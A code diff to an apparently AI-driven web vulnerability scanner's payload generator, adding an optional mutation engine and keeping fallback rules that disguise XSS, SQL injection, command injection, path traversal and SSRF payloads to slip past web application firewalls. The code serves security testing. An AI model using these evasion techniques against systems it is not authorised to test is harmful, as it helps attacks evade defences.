@@ -5,68 +5,96 @@ Generates context-aware payloads using AI + known payload database.
 Includes WAF bypass mutations and encoding tricks.
 """
 import json
+import logging
 import random
 from urllib.parse import quote, quote_plus
 
 from app.ai.llm_engine import LLMEngine
 
+try:
+    from app.modules.mutation_engine import MutationEngine
+    _mutation_engine = MutationEngine()
+    _HAS_MUTATION_ENGINE = True
+except Exception:
+    _mutation_engine = None
+    _HAS_MUTATION_ENGINE = False
 
-def _mutate_for_waf(payload: str, vuln_type: str) -> list[str]:
+logger = logging.getLogger(__name__)
+
+# Map internal vuln_type names to MutationEngine context strings
+_VULN_TYPE_TO_MUTATION_CTX = {
+    "xss": "xss",
+    "xss_reflected": "xss",
+    "xss_stored": "xss",
+    "sqli": "sqli",
+    "sqli_blind": "sqli",
+    "cmd_injection": "command",
+    "rce": "command",
+    "lfi": "path",
+    "path_traversal": "path",
+    "ssti": "generic",
+    "ssrf": "generic",
+    "idor": "generic",
+    "open_redirect": "generic",
+    "cors_misconfiguration": "generic",
+}
+
+
+def _mutate_for_waf(payload: str, vuln_type: str, waf_name: str = "", max_variants: int = 6) -> list[str]:
     """Generate WAF bypass mutations of a payload.
-    Returns 2-4 mutated variants that may bypass common WAFs."""
+    Uses MutationEngine for comprehensive mutations, falls back to basic logic."""
+
+    # Try MutationEngine first
+    if _HAS_MUTATION_ENGINE and _mutation_engine:
+        try:
+            ctx = _VULN_TYPE_TO_MUTATION_CTX.get(vuln_type, "generic")
+            variants = _mutation_engine.mutate(
+                payload,
+                context=ctx,
+                waf_name=waf_name or None,
+                max_variants=max_variants,
+            )
+            # mutate() returns original as first element — strip it
+            return [v for v in variants if v != payload][:max_variants]
+        except Exception as e:
+            logger.debug("MutationEngine failed, using fallback: %s", e)
+
+    # ── Fallback: original simple mutations ──
     mutations = []
 
     if vuln_type in ("xss", "xss_reflected", "xss_stored"):
-        # Case variation
         mutations.append(payload.replace("script", "ScRiPt").replace("alert", "aLeRt"))
-        # Double URL encoding
         mutations.append(quote(payload, safe=""))
-        # HTML entity encoding for event handlers
         mutations.append(payload.replace("onerror", "&#111;nerror").replace("onload", "&#111;nload"))
-        # Null bytes in tags
         mutations.append(payload.replace("<", "<%00").replace(">", "%00>"))
 
     elif vuln_type in ("sqli", "sqli_blind"):
-        # Comment as space bypass
         mutations.append(payload.replace(" ", "/**/"))
-        # Tab/newline as space
         mutations.append(payload.replace(" ", "%09"))
         mutations.append(payload.replace(" ", "%0a"))
-        # MySQL version comment
         if "OR" in payload.upper():
             mutations.append(payload.replace("OR", "/*!50000OR*/").replace("or", "/*!50000OR*/"))
-        # Case variation
         mutations.append(payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN")
                         .replace("select", "SeLeCt").replace("union", "UnIoN"))
 
     elif vuln_type in ("cmd_injection", "rce"):
-        # $IFS bypass (replaces space)
         mutations.append(payload.replace(" ", "${IFS}"))
-        # Quote bypass
         mutations.append(payload.replace(" ", "$IFS$9"))
-        # Concatenation bypass
         if "id" in payload:
             mutations.append(payload.replace("id", "'i''d'"))
             mutations.append(payload.replace("id", "i\\d"))
 
     elif vuln_type in ("lfi", "path_traversal"):
-        # Double URL encoding
         mutations.append(payload.replace("../", "%252e%252e%252f"))
-        # UTF-8 overlong encoding
         mutations.append(payload.replace("../", "..%c0%af"))
-        # Dot-dot-slash variations
         mutations.append(payload.replace("../", "....//"))
 
     elif vuln_type == "ssrf":
-        # Decimal IP for 127.0.0.1
         mutations.append(payload.replace("127.0.0.1", "2130706433"))
-        # Hex IP
         mutations.append(payload.replace("127.0.0.1", "0x7f000001"))
-        # IPv6
         mutations.append(payload.replace("127.0.0.1", "[::ffff:127.0.0.1]"))
 
-    # Filter empty/identical and return unique
-    return [m for m in mutations if m and m != payload][:4]
+    return [m for m in mutations if m and m != payload][:max_variants]
 
 
 VULN_TYPE_ALIASES = {
@@ -198,12 +226,37 @@ class PayloadGenerator:
 
             # WAF bypass: generate mutations for top payloads
             if has_waf:
+                waf_name = (context.get("waf_info") or {}).get("waf_name", "")
                 waf_mutations = []
-                for p in merged[:6]:
-                    for m in _mutate_for_waf(p, vuln_type):
-                        if m not in seen_payloads:
-                            waf_mutations.append(m)
-                            seen_payloads.add(m)
+
+                # If MutationEngine available, use mutate_batch for efficiency
+                if _HAS_MUTATION_ENGINE and _mutation_engine:
+                    try:
+                        ctx = _VULN_TYPE_TO_MUTATION_CTX.get(vuln_type, "generic")
+                        batch_variants = _mutation_engine.mutate_batch(
+                            merged[:8],
+                            context=ctx,
+                            waf_name=waf_name or None,
+                            max_per_payload=6,
+                        )
+                        for m in batch_variants:
+                            if m not in seen_payloads:
+                                waf_mutations.append(m)
+                                seen_payloads.add(m)
+                    except Exception as e:
+                        logger.debug("MutationEngine batch failed, falling back: %s", e)
+                        for p in merged[:6]:
+                            for m in _mutate_for_waf(p, vuln_type, waf_name=waf_name):
+                                if m not in seen_payloads:
+                                    waf_mutations.append(m)
+                                    seen_payloads.add(m)
+                else:
+                    for p in merged[:6]:
+                        for m in _mutate_for_waf(p, vuln_type, waf_name=waf_name):
+                            if m not in seen_payloads:
+                                waf_mutations.append(m)
+                                seen_payloads.add(m)
+
                 merged.extend(waf_mutations)
 
             raw_payloads = merged
